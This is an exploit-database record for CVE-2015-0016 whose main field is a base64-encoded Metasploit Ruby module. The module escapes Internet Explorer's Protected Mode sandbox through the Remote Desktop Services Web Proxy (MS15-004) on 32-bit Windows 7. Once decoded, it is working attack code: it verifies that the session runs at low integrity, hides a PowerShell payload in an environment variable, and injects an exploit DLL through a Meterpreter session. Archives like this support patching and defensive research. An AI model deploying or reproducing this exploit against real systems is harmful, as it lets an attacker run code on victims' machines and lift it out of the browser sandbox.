{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cDovL21ldGFzcGxvaXQuY29tL2Rvd25sb2FkDQojIEN1cnJlbnQgc291cmNlOiBodHRwczovL2dpdGh1Yi5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrDQojIw0KDQpyZXF1aXJlICdtc2YvY29yZScNCg0KY2xhc3MgTWV0YXNwbG9pdDMgPCBNc2Y6OkV4cGxvaXQ6OkxvY2FsDQogIFJhbmsgPSBHb29kUmFua2luZw0KDQogIGluY2x1ZGUgTXNmOjpQb3N0OjpGaWxlDQogIGluY2x1ZGUgTXNmOjpQb3N0OjpXaW5kb3dzOjpQcml2DQogIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpQb3dlcnNoZWxsDQoNCiAgZGVmIGluaXRpYWxpemUoaW5mbz17fSkNCiAgICBzdXBlcih1cGRhdGVfaW5mbyhpbmZvLCB7DQogICAgICAnTmFtZScgICAgICAgICAgID0+ICdNUzE1LTAwNCBNaWNyb3NvZnQgUmVtb3RlIERlc2t0b3AgU2VydmljZXMgV2ViIFByb3h5IElFIFNhbmRib3ggRXNjYXBlJywNCiAgICAgICdEZXNjcmlwdGlvbicgICAgPT4gJXF7DQogICAgICAgIFRoaXMgbW9kdWxlIGFidXNlcyBhIHByb2Nlc3MgY3JlYXRpb24gcG9saWN5IGluIEludGVybmV0IEV4cGxvcmVyJ3Mgc2FuZGJveCwgc3BlY2lmaWNhbGx5DQogICAgICAgIHRoZSBNaWNyb3NvZnQgUmVtb3RlIERlc2t0b3AgU2VydmljZXMgV2ViIFByb3h5IElFIG9uZSwgd2hpY2ggYWxsb3dzIHRoZSBhdHRhY2tlciB0byBlc2NhcGUNCiAgICAgICAgdGhlIFByb3RlY3RlZCBNb2RlLCBhbmQgZXhlY3V0ZSBjb2RlIHdpdGggTWVkaXVtIEludGVncml0eS4gQXQgdGhlIG1vbWVudCwgdGhpcyBtb2R1bGUgb25seQ0KICAgICAgICBieXBhc3MgUHJvdGVjdGVkIE1vZGUgb24gV2luZG93cyA3IFNQMSBhbmQgcHJpb3IgKDMyIGJpdHMpLiBUaGlzIG1vZHVsZSBoYXMgYmVlbiB0ZXN0ZWQNCiAgICAgICAgc3VjY2Vzc2Z1bGx5IG9uIFdpbmRvd3MgNyBTUDEgKDMyIGJpdHMpIHdpdGggSUUgOCBhbmQgSUUgMTEuDQogICAgICB9LA0KICAgICAgJ0xpY2Vuc2UnICAgICAgICA9PiBNU0ZfTElDRU5TRSwNCiAgICAgICdBdXRob3InICAgICAgICAgPT4NCiAgICAgICAgWw0KICAgICAgICAgICdVbmtub3duJywgIyBGcm9tIFRocmVhdCBJbnRlbCBvZiBTeW1hbnRlYw0KICAgICAgICAgICdIZW5yeSBMaScsICMgUHVibGljIHZ1bG5lcmFiaWxpdHkgYW5hbHlzaXMNCiAgICAgICAgICAnanVhbiB2YXpxdWV6JyAjIE1ldGFzcGxvaXQgbW9kdWxlDQogICAgICAgIF0sDQogICAgICAnUGxhdGZvcm0nICAgICAgID0+ICd3aW4nLA0KICAgICAgJ1Nlc3Npb25UeXBlcycgICA9PiBbJ21ldGVycHJldGVyJ10sDQogICAgICAnQXJjaCcgICAgICAgICAgID0+IFtBUkNIX1g4Nl0sDQogICAgICAnRGVmYXVsdE9wdGlvbnMnID0+DQogICAgICAgIHsNCiAgICAgICAgICAnRVhJVEZVTkMnID0+ICd0aHJlYWQnLA0KICAgICAgICAgICdXZnNEZWxheScgPT4gMzANCiAgICAgICAgfSwNCiAgICAgICdUYXJnZXRzJyAgICAgICAgPT4NCiAgICAgICAgWw0KICAgICAgICAgIFsgJ1Byb3RlY3RlZCBNb2RlIChXaW5kb3dzIDcpIC8gMzIgYml0cycsDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICdBcmNoJyA9PiBBUkNIX1g4Ng0KICAgICAgICAgICAgfQ0KICAgICAgICAgIF0NCiAgICAgICAgXSwNCiAgICAgICdEZWZhdWx0VGFyZ2V0JyAgPT4gMCwNCiAgICAgICdQYXlsb2FkJyAgICAgICAgPT4NCiAgICAgICAgew0KICAgICAgICAgICdTcGFjZScgICAgICAgPT4gNDA5NiwNCiAgICAgICAgICAnRGlzYWJsZU5vcHMnID0+IHRydWUNCiAgICAgICAgfSwNCiAgICAgICdSZWZlcmVuY2VzJyAgICAgPT4NCiAgICAgICAgWw0KICAgICAgICAgIFsnQ1ZFJywgJzIwMTUtMDAxNiddLA0KICAgICAgICAgIFsnTVNCJywgJ01TMTUtMDA0J10sDQogICAgICAgICAgWydVUkwnLCAnaHR0cDovL2Jsb2cudHJlbmRtaWNyby5jb20vdHJlbmRsYWJzLXNlY3VyaXR5LWludGVsbGlnZW5jZS9jdmUtMjAxNS0wMDE2LWVzY2FwaW5nLXRoZS1pbnRlcm5ldC1leHBsb3Jlci1zYW5kYm94LyddDQogICAgICAgIF0sDQogICAgICAnRGlzY2xvc3VyZURhdGUnID0+ICdKYW4gMTMgMjAxNScNCiAgICB9KSkNCiAgZW5kDQoNCiAgZGVmIGNoZWNrDQogICAgdGVtcCA9IGdldF9lbnYoJ1dJTkRJUicpDQogICAgZGxsX3BhdGggPSAiI3t0ZW1wfVxcU3lzdGVtMzJcXFRTV2JQcnh5LmV4ZSINCg0KICAgIHdpbl92ZXIgPSBzeXNpbmZvWydPUyddDQoNCiAgICB1bmxlc3Mgd2luX3ZlciA9fiAvV2luZG93cyBWaXN0YXxXaW5kb3dzIDIwMDh8V2luZG93cyAyMDEyfFdpbmRvd3MgWzc4XS8NCiAgICAgIHJldHVybiBFeHBsb2l0OjpDaGVja0NvZGU6OlNhZmUNCiAgICBlbmQNCg0KICAgIHVubGVzcyBmaWxlX2V4aXN0PyhkbGxfcGF0aCkNCiAgICAgIHJldHVybiBFeHBsb2l0OjpDaGVja0NvZGU6OlNhZmUNCiAgICBlbmQNCg0KICAgIEV4cGxvaXQ6OkNoZWNrQ29kZTo6RGV0ZWN0ZWQNCiAgZW5kDQoNCiAgZGVmIGV4cGxvaXQNCiAgICBwcmludF9zdGF0dXMoJ0NoZWNraW5nIHRhcmdldC4uLicpDQogICAgdW5sZXNzIGNoZWNrID09IEV4cGxvaXQ6OkNoZWNrQ29kZTo6RGV0ZWN0ZWQNCiAgICAgIGZhaWxfd2l0aChGYWlsdXJlOjpOb3RWdWxuZXJhYmxlLCAnU3lzdGVtIG5vdCB2dWxuZXJhYmxlJykNCiAgICBlbmQNCg0KICAgIGlmIHNlc3Npb24ucGxhdGZvcm0gIX4gL154ODZcLy8NCiAgICAgIGZhaWxfd2l0aChGYWlsdXJlOjpOb3RWdWxuZXJhYmxlLCAnU29ycnksIHRoaXMgbW9kdWxlIGN1cnJlbnRseSBvbmx5IGFsbG93cyB4ODYvd2luMzIgc2Vzc2lvbnMgYXQgdGhlIG1vbWVudCcpDQogICAgZW5kDQoNCiAgICB3aW5fdmVyID0gc3lzaW5mb1snT1MnXQ0KICAgIGlmIHdpbl92ZXIgPX4gL1dpbmRvd3MgMjAxMnxXaW5kb3dzIDgvDQogICAgICBmYWlsX3dpdGgoRmFpbHVyZTo6Tm90VnVsbmVyYWJsZSwgJ1RoaXMgbW9kdWxlIGRvZXNuXCd0IHJ1biBvbiBXaW5kb3dzIDgvMjAxMiBhdCB0aGUgbW9tZW50JykNCiAgICBlbmQNCg0KICAgIHByaW50X3N0YXR1cygnQ2hlY2tpbmcgdGhlIFByb2Nlc3MgSW50ZWdyaXR5IExldmVsLi4uJykNCg0KICAgIHVubGVzcyBnZXRfaW50ZWdyaXR5X2xldmVsID09IElOVEVHUklUWV9MRVZFTF9TSURbOmxvd10NCiAgICAgIGZhaWxfd2l0aChGYWlsdXJlOjpOb3RWdWxuZXJhYmxlLCAnTm90IHJ1bm5pbmcgYXQgTG93IEludGVncml0eScpDQogICAgZW5kDQoNCiAgICBjbWQgPSBjbWRfcHNoX3BheWxvYWQoDQogICAgICBwYXlsb2FkLmVuY29kZWQsDQogICAgICBwYXlsb2FkX2luc3RhbmNlLmFyY2guZmlyc3QsDQogICAgICB7IDpyZW1vdmVfY29tc3BlYyA9PiB0cnVlIH0NCiAgICApDQoNCiAgICBwcmludF9zdGF0dXMoJ1N0b3JpbmcgcGF5bG9hZCBvbiBlbnZpcm9ubWVudCB2YXJpYWJsZS4uLicpDQogICAgY21kLmdzdWIhKCdwb3dlcnNoZWxsLmV4ZSAnLCcnKQ0KICAgIHNlc3Npb24ucmFpbGd1bi5rZXJuZWwzMi5TZXRFbnZpcm9ubWVudFZhcmlhYmxlQSgnUFNIQ01EJywgY21kKQ0KDQogICAgcHJpbnRfc3RhdHVzKCdFeHBsb2l0aW5nLi4uJykNCiAgICB0ZW1wID0gZ2V0X2VudignVEVNUCcpDQogICAgIyBVc2luZyB0aGUgb2xkIG1ldGVycHJldGVyIGxvYWRlciwgaWYgaXQncyBsb2FkZWQgd2l0aA0KICAgICMgUmVmbGVjdGl2ZSBETEwgSW5qZWN0aW9uIHRoZSBleGNlcHRpb25zIGluIHRoZSBzYW5kYm94DQogICAgIyBwb2xpY3kgd29uJ3QgYXBwbHkuDQogICAgc2Vzc2lvbi5jb3JlLmxvYWRfbGlicmFyeSgNCiAgICAgICdMaWJyYXJ5RmlsZVBhdGgnID0+IDo6RmlsZS5qb2luKE1zZjo6Q29uZmlnLmRhdGFfZGlyZWN0b3J5LCAnZXhwbG9pdHMnLCAnQ1ZFLTIwMTUtMDAxNicsICdjdmUtMjAxNS0wMDE2LmRsbCcpLA0KICAgICAgJ1RhcmdldEZpbGVQYXRoJyAgPT4gdGVtcCArICAnXFxjdmUtMjAxNS0wMDE2LmRsbCcsDQogICAgICAnVXBsb2FkTGlicmFyeScgICA9PiB0cnVlLA0KICAgICAgJ0V4dGVuc2lvbicgICAgICAgPT4gZmFsc2UsDQogICAgICAnU2F2ZVRvRGlzaycgICAgICA9PiBmYWxzZQ0KICAgICkNCiAgZW5kDQoNCiAgZGVmIGNsZWFudXANCiAgICBzZXNzaW9uLnJhaWxndW4ua2VybmVsMzIuU2V0RW52aXJvbm1lbnRWYXJpYWJsZUEoJ1BTSENNRCcsIG5pbCkNCiAgICBzdXBlcg0KICBlbmQNCg0KZW5k", 
    "filename": "platforms/windows/local/35983.rb", 
    "id": "35983", 
    "cves": [
        "CVE-2015-0016"
    ]
}